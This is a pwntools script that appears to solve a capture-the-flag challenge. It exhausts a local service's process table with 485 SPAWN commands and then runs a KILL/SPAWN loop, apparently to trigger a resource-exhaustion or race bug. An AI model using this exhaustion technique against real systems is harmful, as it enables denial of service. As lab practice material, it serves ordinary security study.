from pwn import *
import time

# Configuration
HOST = 'localhost'
PORT = 1337
SPAWN_COUNT = 485  # Enough to hit the PROC_LIMIT
TOTAL_YOUNGLINGS = 15

def solve():
    try:
        # Connect to the socat server
        io = remote(HOST, PORT)
        
        # 1. Initial Exhaustion Phase
        log.info(f"Spawning {SPAWN_COUNT} Younglings...")
        for i in range(SPAWN_COUNT):
            io.sendline(b"SPAWN")
            # Minimal sleep to prevent slamming the socket buffer too hard
            time.sleep(0.01)
            line = io.recvuntil(b">", timeout=1).decode()
            print(line)

        log.info("Process table should be full. Starting Kill/Spawn loop...")

        for i in range(3):
            for j in range(TOTAL_YOUNGLINGS - 1):
                io.sendline(f"KILL {j}")
                # time.sleep(0.01)
                line = io.recvuntil(b">", timeout=1).decode()
                # time.sleep(0.01)
                print(line)
                
                io.sendline(b"SPAWN")
                # time.sleep(0.01)
                line = io.recvuntil(b">", timeout=1).decode()
                # time.sleep(0.01)
                print(line)

            # Last one differs
            io.sendline(f"KILL {TOTAL_YOUNGLINGS - 1}")
            time.sleep(0.01)
            line = io.recv(4096).decode()
            time.sleep(0.01)
            print(line)
                

    except EOFError:
        log.error("Server closed the connection. Check if PROC_LIMIT was hit too early.")

if __name__ == "__main__":
    solve()